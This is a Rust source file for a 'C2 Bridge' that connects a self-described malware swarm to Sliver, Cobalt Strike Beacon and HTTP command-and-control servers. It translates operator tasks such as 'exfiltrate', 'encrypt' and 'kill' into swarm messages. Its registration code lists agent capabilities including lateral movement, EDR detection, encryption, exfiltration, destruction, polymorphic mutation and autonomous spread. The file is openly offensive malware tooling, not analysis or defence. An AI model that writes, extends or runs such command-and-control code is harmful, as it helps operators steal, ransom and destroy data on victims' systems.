// C2 Bridge: translates Swarm LdC protocol to standard C2 formats.
// Enables Swarm agents to be controlled from Sliver, Cobalt Strike,
// or any C2 that speaks gRPC, Beacon SMB/TCP, or HTTP.
//
// Protocol translators:
//   LdC → Sliver gRPC (protobuf)
//   LdC → Cobalt Strike Beacon (SMB named pipe)
//   Sliver/Cobalt Strike → LdC (inject commands into swarm)

use crate::ldc::{Message, Payload, Role, Value};
use serde::{Deserialize, Serialize};
use uuid::Uuid;
use std::collections::HashMap;

// ── Standard External C2 Message Format ──────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExternalTask {
    pub task_id: String,
    pub command: String,
    pub arguments: Vec<String>,
    pub target_agent: Option<String>,
    pub timeout_ms: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExternalResponse {
    pub task_id: String,
    pub agent_id: String,
    pub success: bool,
    pub output: String,
    pub beliefs: Vec<ExternalBelief>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExternalBelief {
    pub asset: String,
    pub value: String,
    pub confidence: f32,
}

// ── Sliver gRPC Bridge ───────────────────────────────────────────────────────

pub struct SliverBridge {
    pub agent_id: Uuid,
    pub c2_endpoint: String,
}

impl SliverBridge {
    pub fn new(agent_id: Uuid, c2_endpoint: &str) -> Self {
        Self { agent_id, c2_endpoint: c2_endpoint.to_string() }
    }

    /// Convert an LdC Belief to a Sliver session note
    pub fn belief_to_sliver_note(belief: &Message, asset: &str, value: &Value, confidence: f32) -> HashMap<String, String> {
        let mut note = HashMap::new();
        note.insert("type".into(), "swarm_belief".into());
        note.insert("agent_id".into(), belief.agent_id.to_string());
        note.insert("agent_role".into(), format!("{:?}", belief.agent_role));
        note.insert("asset".into(), asset.to_string());
        note.insert("value".into(), format!("{:?}", value));
        note.insert("confidence".into(), confidence.to_string());
        note.insert("timestamp".into(), belief.timestamp.to_string());
        note
    }

    /// Convert a Sliver command to an LdC Proposal
    pub fn sliver_cmd_to_proposal(cmd: &str, args: &[String]) -> (Message, Uuid) {
        Message::proposal(
            Uuid::new_v4(),
            Role::Queen,
            format!("sliver_cmd:{}", cmd),
            format!("Sliver operator command: {} {}", cmd, args.join(" ")),
        )
    }

    /// Format an LdC message as a Sliver-compatible gRPC request body
    pub fn to_sliver_envelope(msg: &Message) -> Vec<u8> {
        // Simplified gRPC-ish envelope
        let payload = serde_json::to_vec(&ExternalResponse {
            task_id: Uuid::new_v4().to_string(),
            agent_id: msg.agent_id.to_string(),
            success: true,
            output: format!("{:?}", msg.payload),
            beliefs: Vec::new(),
        }).unwrap_or_default();
        payload
    }
}

// ── Cobalt Strike Beacon Bridge ──────────────────────────────────────────────

pub struct CSBridge {
    pub agent_id: Uuid,
    pub beacon_pipe: String,
}

impl CSBridge {
    pub fn new(agent_id: Uuid) -> Self {
        Self {
            agent_id,
            beacon_pipe: format!("\\\\.\\pipe\\swarm_beacon_{}", agent_id),
        }
    }

    /// Convert LdC Belief to CS Beacon callback format
    pub fn belief_to_beacon_callback(msg: &Message, asset: &str, value: &Value, confidence: f32) -> Vec<u8> {
        let mut buf = Vec::new();

        // CS callback type (0x21 = user-defined)
        buf.push(0x21);

        // Agent ID (first 4 bytes of UUID)
        let id_bytes = msg.agent_id.as_bytes();
        buf.extend_from_slice(&id_bytes[..4]);

        // Timestamp
        buf.extend_from_slice(&msg.timestamp.to_le_bytes());

        // Asset name (null-terminated)
        buf.extend_from_slice(asset.as_bytes());
        buf.push(0);

        // Value
        let val_str = format!("{:?}", value);
        buf.extend_from_slice(val_str.as_bytes());
        buf.push(0);

        // Confidence as u8 percentage
        buf.push((confidence * 100.0) as u8);

        buf
    }

    /// Parse a CS beacon task into an LdC Proposal
    pub fn beacon_task_to_proposal(task_data: &[u8]) -> Option<(Message, Uuid)> {
        if task_data.is_empty() { return None; }

        let cmd_type = task_data[0];
        let cmd_str = match cmd_type {
            0x01 => "beacon_exec".to_string(),
            0x02 => "beacon_upload".to_string(),
            0x03 => "beacon_download".to_string(),
            0x04 => "beacon_shell".to_string(),
            _ => format!("beacon_task_{}", cmd_type),
        };

        Some(Message::proposal(
            Uuid::new_v4(),
            Role::Queen,
            format!("cs_cmd:{}", cmd_str),
            format!("Cobalt Strike beacon task type {}", cmd_type),
        ))
    }
}

// ── HTTP C2 Bridge (generic REST API) ────────────────────────────────────────

pub struct HttpBridge {
    pub c2_url: String,
    pub auth_token: Option<String>,
}

impl HttpBridge {
    pub fn new(c2_url: &str, auth_token: Option<&str>) -> Self {
        Self {
            c2_url: c2_url.to_string(),
            auth_token: auth_token.map(|s| s.to_string()),
        }
    }

    /// Register this swarm agent with the external C2
    pub fn build_registration(&self, agent_id: Uuid, role: Role) -> Vec<u8> {
        serde_json::to_vec(&serde_json::json!({
            "type": "register",
            "agent_id": agent_id.to_string(),
            "role": format!("{:?}", role),
            "protocol": "swarm_ldc_v1",
            "capabilities": match role {
                Role::Worker => vec!["recon", "edr_detection", "ml_classification"],
                Role::Drone => vec!["lateral_movement", "auto_regeneration", "marl_policy"],
                Role::Honeybee => vec!["encrypt", "exfiltrate", "destroy"],
                Role::Weaver => vec!["obfuscate", "polymorphic_mutation"],
                Role::Queen => vec!["llm_oracle", "strategic_planning", "bridge"],
                Role::Swarm => vec!["autonomous_spread"],
            },
        })).unwrap_or_default()
    }

    /// Parse an HTTP C2 task into LdC messages
    pub fn parse_http_task(body: &[u8]) -> Vec<Message> {
        let task: Option<ExternalTask> = serde_json::from_slice(body).ok();
        let mut messages = Vec::new();

        if let Some(task) = task {
            match task.command.as_str() {
                "scan" => {
                    messages.push(Message {
                        agent_id: Uuid::new_v4(),
                        agent_role: Role::Queen,
                        timestamp: crate::utils::timestamp_now(),
                        payload: Payload::Request {
                            service: "scan".into(),
                            payload: Vec::new(),
                        },
                    });
                }
                "exfiltrate" => {
                    messages.push(Message {
                        agent_id: Uuid::new_v4(),
                        agent_role: Role::Queen,
                        timestamp: crate::utils::timestamp_now(),
                        payload: Payload::Desire {
                            action: "exfiltrate".into(),
                            priority: 0.9,
                        },
                    });
                }
                "encrypt" => {
                    messages.push(Message {
                        agent_id: Uuid::new_v4(),
                        agent_role: Role::Queen,
                        timestamp: crate::utils::timestamp_now(),
                        payload: Payload::Desire {
                            action: "encrypt".into(),
                            priority: 0.8,
                        },
                    });
                }
                "kill" => {
                    messages.push(Message {
                        agent_id: Uuid::new_v4(),
                        agent_role: Role::Queen,
                        timestamp: crate::utils::timestamp_now(),
                        payload: Payload::StatusEvent {
                            event_type: "kill_switch".into(),
                            subject_id: Uuid::new_v4(),
                            subject_role: Role::Queen,
                            detail: "Operator-initiated shutdown".into(),
                        },
                    });
                }
                "inject_belief" => {
                    if task.arguments.len() >= 2 {
                        messages.push(Message::belief(
                            Uuid::new_v4(),
                            Role::Queen,
                            task.arguments[0].clone(),
                            Value::String(task.arguments[1].clone()),
                            1.0,
                        ));
                    }
                }
                _ => {
                    // Unknown command: forward as query to Overmind
                    messages.push(Message {
                        agent_id: Uuid::new_v4(),
                        agent_role: Role::Queen,
                        timestamp: crate::utils::timestamp_now(),
                        payload: Payload::Query {
                            dilemma: task.command.clone(),
                            context: task.arguments.join(" "),
                            query_id: Uuid::new_v4(),
                        },
                    });
                }
            }
        }

        messages
    }
}

// ── Bridge Manager ───────────────────────────────────────────────────────────

pub enum BridgeMode {
    Sliver { endpoint: String },
    CobaltStrike { pipe: String },
    Http { url: String, token: Option<String> },
    None,
}

pub struct BridgeManager {
    pub mode: BridgeMode,
}

impl BridgeManager {
    pub fn new(mode: BridgeMode) -> Self {
        Self { mode }
    }

    /// Dispatch an LdC message to the appropriate C2 bridge
    pub fn dispatch_belief(&self, msg: &Message) -> Option<Vec<u8>> {
        match (&self.mode, &msg.payload) {
            (BridgeMode::Sliver { .. }, Payload::Belief { asset, value, confidence }) => {
                let note = SliverBridge::belief_to_sliver_note(msg, asset, value, *confidence);
                Some(serde_json::to_vec(&note).unwrap_or_default())
            }
            (BridgeMode::CobaltStrike { .. }, Payload::Belief { asset, value, confidence }) => {
                Some(CSBridge::belief_to_beacon_callback(msg, asset, value, *confidence))
            }
            (BridgeMode::Http { .. }, Payload::Belief { asset, value, confidence }) => {
                Some(serde_json::to_vec(&serde_json::json!({
                    "type": "belief",
                    "agent_id": msg.agent_id.to_string(),
                    "role": format!("{:?}", msg.agent_role),
                    "asset": asset,
                    "value": format!("{:?}", value),
                    "confidence": confidence,
                })).unwrap_or_default())
            }
            _ => None,
        }
    }
}
